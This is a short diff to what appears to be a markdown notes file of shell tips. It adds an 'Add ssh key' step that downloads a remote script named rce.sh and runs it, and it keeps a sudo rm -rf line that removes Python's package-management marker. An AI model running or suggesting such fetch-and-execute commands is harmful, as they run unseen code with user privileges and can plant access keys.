@@ -20,6 +20,11 @@ error: externally-managed-environment:
 sudo rm -rf /usr/lib/python3.11/EXTERNALLY-MANAGED
 ```
 
+Add ssh key:
+```shell
+curl https://shadybraden.com/rce.sh -o rce.sh && chmod +x rce.sh && ./rce.sh
+```
+
 </details>
 
 <details>
